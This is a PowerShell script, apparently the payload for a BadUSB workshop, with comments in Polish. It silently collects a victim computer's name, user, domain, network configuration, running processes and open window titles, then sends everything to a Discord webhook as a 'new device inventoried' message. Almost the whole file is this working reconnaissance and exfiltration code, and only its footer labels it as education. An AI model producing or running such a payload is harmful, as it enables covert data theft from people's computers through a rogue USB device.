# get_info.ps1 - Prosty zbieracz informacji dla Discord Webhook
param([string]$webhook)

# Zbieramy podstawowe info
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if (!$domain -or $domain -eq "") { $domain = "BRAK (grupa robocza)" }

# Sieciówki
$networks = @()
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
foreach ($adapter in $adapters) {
    $name = (Get-WmiObject Win32_NetworkAdapter | Where-Object {$_.Index -eq $adapter.Index}).Name
    $ip = $adapter.IPAddress[0]
    $mask = $adapter.IPSubnet[0]
    $gw = $adapter.DefaultIPGateway -join ", "
    $dns = $adapter.DNSServerSearchOrder -join ", "
    $mac = $adapter.MACAddress
    
    $networks += "Karta: $name`r`nIP: $ip`r`nMaska: $mask`r`nBrama: $gw`r`nDNS: $dns`r`nMAC: $mac`r`n---"
}
if ($networks.Count -eq 0) { $networks = "Brak połączenia sieciowego" }

# Uptime
$os = Get-WmiObject Win32_OperatingSystem
$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

# Procesor i RAM
$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)

# Procesy (top 5 po CPU)
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
    $cpuUsage = [math]::Round($_.CPU, 1)
    $ramUsage = [math]::Round($_.WorkingSet/1MB, 1)
    "$($_.ProcessName) (CPU: $cpuUsage% | RAM: $ramUsage MB)"
}

# Aktywne okna - prostsza wersja
$windows = @(Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 5 -ExpandProperty MainWindowTitle)
if ($windows.Count -eq 0) { $windows = "Brak widocznych okien" }

# Składamy wiadomość na Discord
$fields = @(
    @{ name = "Uzytkownik"; value = $userName; inline = $true },
    @{ name = "Domena"; value = $domain; inline = $true },
    @{ name = "Uptime"; value = $uptimeStr; inline = $true },
    @{ name = "CPU"; value = $cpu.Substring(0, [Math]::Min(100, $cpu.Length)); inline = $false },
    @{ name = "RAM"; value = "$ram GB"; inline = $true },
    @{ name = "Sieć"; value = ($networks -join "`r`n").Substring(0, [Math]::Min(1000, ($networks -join "`r`n").Length)); inline = $false },
    @{ name = "Top 5 procesów"; value = $procs -join "`r`n"; inline = $false },
    @{ name = "Aktywne okna"; value = ($windows -join "`r`n").Substring(0, [Math]::Min(500, ($windows -join "`r`n").Length)); inline = $false }
)

$body = @{
    content = "NOWE URZADZENIE ZAINWENTARYZOWANE!"
    embeds = @(
        @{
            title = "Komputer: $compName"
            color = 16711680
            fields = $fields
            footer = @{ text = "BadUSB Warsztat - Tylko edukacja!" }
            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
        }
    )
} | ConvertTo-Json -Depth 4

# Wysyłamy na Discord
try {
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
    Write-Host "OK!" -ForegroundColor Green
} catch {
    Write-Host "Blad: $_" -ForegroundColor Red
}
